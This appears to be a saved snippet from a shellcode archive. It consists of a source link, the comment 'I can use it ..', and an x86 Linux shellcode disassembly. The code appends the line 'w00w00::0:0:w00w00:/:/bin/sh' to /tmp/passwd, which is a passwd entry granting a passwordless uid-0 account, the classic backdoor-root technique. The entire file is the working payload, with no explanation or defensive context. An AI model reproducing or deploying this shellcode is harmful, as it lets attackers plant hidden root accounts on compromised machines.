#http://shell-storm.org/shellcode/files/shellcode-165.php

#I can use it ..

"""
00000000  EB2B              jmp short 0x2d 
00000002  5E                pop esi
00000003  31C0              xor eax,eax
00000005  88460B            mov [esi+0xb],al
00000008  884629            mov [esi+0x29],al
0000000B  50                push eax
0000000C  B009              mov al,0x9
0000000E  50                push eax
0000000F  31C0              xor eax,eax
00000011  56                push esi
00000012  50                push eax
00000013  B005              mov al,0x5
00000015  CD80              int 0x80
00000017  89C3              mov ebx,eax
00000019  6A1D              push byte +0x1d
0000001B  8D460C            lea eax,[esi+0xc]
0000001E  50                push eax
0000001F  53                push ebx
00000020  50                push eax
00000021  31C0              xor eax,eax
00000023  B004              mov al,0x4
00000025  CD80              int 0x80
00000027  31C0              xor eax,eax
00000029  B001              mov al,0x1
0000002B  CD80              int 0x80
0000002D  E8D0FFFFFF        call dword 0x2
00000032  2F                das
00000033  746D              jz 0xa2
00000035  702F              jo 0x66
00000037  7061              jo 0x9a
00000039  7373              jnc 0xae
0000003B  7764              ja 0xa1
0000003D  307730            xor [edi+0x30],dh
00000040  307730            xor [edi+0x30],dh
00000043  303A              xor [edx],bh
00000045  3A30              cmp dh,[eax]
00000047  3A30              cmp dh,[eax]
00000049  3A7730            cmp dh,[edi+0x30]
0000004C  307730            xor [edi+0x30],dh
0000004F  303A              xor [edx],bh
00000051  2F                das
00000052  3A2F              cmp ch,[edi]
00000054  62696E            bound ebp,[ecx+0x6e]
00000057  2F                das
00000058  7368              jnc 0xc2
0000005A  0A30              or dh,[eax]
0000005C  FF                db 0xff
0000005D  FF                db 0xff
0000005E  FF                db 0xff
0000005F  FF                db 0xff
00000060  FF                db 0xff
00000061  FF                db 0xff
00000062  FF                db 0xff
00000063  FF                db 0xff
00000064  FF                db 0xff
00000065  FF                db 0xff
00000066  FF                db 0xff
00000067  FF                db 0xff
00000068  FF                db 0xff
00000069  FF                db 0xff
0000006A  FF                db 0xff
0000006B  FF                db 0xff
0000006C  FF                db 0xff
0000006D  FF                db 0xff
0000006E  FF                db 0xff
0000006F  FF                db 0xff
"""